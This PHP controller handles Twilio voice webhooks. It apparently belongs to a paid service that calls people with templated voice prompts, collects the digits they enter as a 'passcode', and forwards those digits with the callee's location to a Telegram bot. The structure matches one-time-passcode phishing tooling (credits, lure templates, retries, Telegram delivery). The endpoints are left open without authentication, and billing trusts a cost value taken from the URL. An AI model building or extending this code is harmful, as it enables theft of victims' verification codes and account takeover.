<?php
App::import('Vendor','Twilio',array('file'=>'twilio'. DS .'autoload.php'));
use Twilio\Jwt\AccessToken;
use Twilio\Jwt\Grants\VoiceGrant;
use Twilio\TwiML\VoiceResponse;
use Twilio\Rest\Client;
class WebhookController extends AppController {
	public $components = array('DatabaseFunction','RequestHandler');
	public $default_conditions = array();
	
	public function call_status() {
		$this->autoRender =false;
		$this->layout ='ajax';
		
		$server_id = $_GET['server'] ?? null;
		$template_id = $_GET['template'] ?? null;
		$cost = $_GET['cost'] ?? 0;

		//update here
		$parent_call_sid = $this->request->data('ParentCallSid');
		$call_sid = $this->request->data('CallSid');
		$dial_status = $this->request->data('CallStatus');
		$call_direction = $this->request->data('Direction');
		$caller_number = $this->request->data('From');
		$to = $this->request->data('To');
		$dial_error_msg = ($this->request->data('ErrorMessage') ? $this->request->data('ErrorMessage') : null);
		$dial_error_code = ($this->request->data('ErrorCode') ? $this->request->data('ErrorCode') : null);
		
		$this->loadModel('Call');
		$data = $this->Call->find('first',array(
			'conditions'=>array(
				'Call.call_sid'=>$call_sid
			)
		));
		
		$data['Call']['call_status'] = $dial_status;
		$data['Call']['dial_error'] = $dial_error_msg;
		$data['Call']['status'] = 1;
		$data['Call']['from_webhook'] = true;
		
		$this->loadModel('User');
		$user_data = $this->User->find('first',array(
			'fields'=> array(
				'User.id',
				'User.voice_credits',
				'User.role',
			),
			'conditions'=>array(
				'User.id'=>$data['Call']['user_id']
			),
			'recursive'=>-1
		));
		
		if($dial_status == 'completed' && $user_data['User']['role'] !== 'Administrator'){
			
			$current_user_credits = $user_data['User']['voice_credits'];
			$required_amount = floatval($cost);
			$remaining_user_credits_after_deduction = ($current_user_credits - $required_amount);
			
			$user_data['User']['id'] = $user_data['User']['id'];
			$user_data['User']['voice_credits'] = $remaining_user_credits_after_deduction;
			$this->User->save($user_data);
		}
		
		$this->Call->save($data);
	}
	
	public function gather() {
		$this->autoRender = false;
		
		$server_id = $_GET['server'] ?? null;
		$template_id = $_GET['template'] ?? null;
		
		$this->loadModel('VoiceTemplate');
		$template_data = $this->VoiceTemplate->find('first',array(
			'fields'=>array(
				'VoiceTemplate.id',
				'VoiceTemplate.name',
				'VoiceTemplate.type',
				'VoiceTemplate.path',
				'VoiceTemplate.passcode_length',
				'VoiceTemplate.language',
				'VoiceTemplate.voice_name',
				'VoiceTemplate.msg_before_input',
				'VoiceTemplate.msg_after_input',
				'VoiceTemplate.msg_no_input',
				'VoiceTemplate.msg_before_end',
			),
			'conditions'=>array(
				'VoiceTemplate.id' => $template_id,
				'VoiceTemplate.status' => 1
			)
		));
		
		$language = $template_data['VoiceTemplate']['language'];
		$voice_name = $template_data['VoiceTemplate']['voice_name'];
		
		$params = array(
				'language'=> $language,
				'voice'=> $voice_name,
			);
		
		$msg_before_input = $template_data['VoiceTemplate']['msg_before_input'];
		$msg_after_input = $template_data['VoiceTemplate']['msg_after_input'];
		$msg_no_input = $template_data['VoiceTemplate']['msg_no_input'];
		$msg_before_end = $template_data['VoiceTemplate']['msg_before_end'];
		
		$path = $template_data['VoiceTemplate']['path'];
		$path = Configure::read('BASE_URL').$path;
		
		$length = $template_data['VoiceTemplate']['passcode_length'];
		$type = $template_data['VoiceTemplate']['type'];
		
		$attempt = (isset($_GET['attempts']) ? intval($_GET['attempts']) : 0);
		$digits = (isset($_POST['Digits']) ? $_POST['Digits'] : '');
		$is_timeout = (isset($_GET['timeout']) ? intval($_GET['timeout']) : 0);
		
		$country = (isset($_POST['ToCountry']) ? $_POST['ToCountry'] : '');
		$city = (isset($_POST['ToCity']) ? $_POST['ToCity'] : '');
		$state = (isset($_POST['ToState']) ? $_POST['ToState'] : '');
		$zip = (isset($_POST['ToZip']) ? $_POST['ToZip'] : '');
		$to = (isset($_POST['To']) ? $_POST['To'] : '');
		$sid = (isset($_POST['CallSid']) ? $_POST['CallSid'] : '');
		$call_status = (isset($_POST['CallStatus']) ? $_POST['CallStatus'] : '');

		$this->RequestHandler->respondAs('xml');
		$response = new VoiceResponse();
		
		if($type !== 'passcode'){
			$response->play($path);
		}else{
			$attempt+=1;
			$gather = $response->gather([
				'timeout'=>10,
				'numDigits'=>$length,
				'action' => Configure::read('BASE_URL')."webhook/gather?server=$server_id&template=$template_id&attempts=$attempt",
				'method' => 'POST'
			]);
			
			if($attempt<=1){
				$gather->play($path);
				$gather->say($msg_before_input,$params);
				$response->say($msg_no_input,$params);
				$response->redirect(Configure::read('BASE_URL')."webhook/gather?server=$server_id&template=$template_id&attempts=$attempt&timeout=1", ['method' => 'POST']);
			}else if($attempt > 3 ){
				$response->say($msg_before_end,$params);
				$this->save_response($sid,$digits,$country,$city,$state,$zip, 'Voice Call ' . $length .' Digit Passcode.');
			}else{
				if($is_timeout <=0){
					$newstring = implode(', ', str_split($digits));
					$new_msg_after_input = str_replace("{dial_input}"," $newstring ",$msg_after_input);
					$gather->say($new_msg_after_input,$params);
					
					//save here
					$this->save_response($sid,$digits,$country,$city,$state,$zip, 'Voice Call ' . $length .' Digit Passcode.');
				}
				
				$gather->say($msg_before_input,$params);
				$response->say($msg_no_input,$params);
				$response->redirect(Configure::read('BASE_URL')."webhook/gather?server=$server_id&template=$template_id&attempts=$attempt&timeout=1", ['method' => 'POST']);
			}
		}

		echo $response;
		
	}
	
	public function save_response($sid,$digits,$country,$city,$state,$zip,$method){
		$this->loadModel('Call');
		$data = $this->Call->find('first',array(
			'conditions'=>array(
				'Call.call_sid'=>$sid
			)
		));
		$db_response = (isset($data['Call']['response']) ? $data['Call']['response'] : '');
		$data['Call']['call_status'] = 'Answered';
		$data['Call']['status'] = 1;
		$data['Call']['from_webhook'] = true;
		
		$number = $data['Call']['to_number'];
		$chat_id = $data['User']['chat_id'];
		
		$this->loadModel('Setting');
		$settings_data = $this->Setting->find('first',array(
			'fields'=> array(
				'Setting.user_telegram_bot',
			),
			'recursive'=>-1
		));
		$token =  $settings_data['Setting']['user_telegram_bot'];
		
		$this->send_call_notification($number,$chat_id,$token,$country,$city,$state,$zip,$method,$digits);
		
		unset($data['User']);
		if (trim($db_response) == ''){
			$data['Call']['response'] = $digits;
		}else{
			$data['Call']['response'] = $db_response . ' OR ' . $digits;
		}
		$this->Call->save($data);
	}
	
	public function beforeFilter() {
		parent::beforeFilter();
		$this->Auth->allow('call_status','gather');
		$this->layout = 'ajax';
	}
	
	public function isAuthorized($user) {
		return true;
	}
}
?>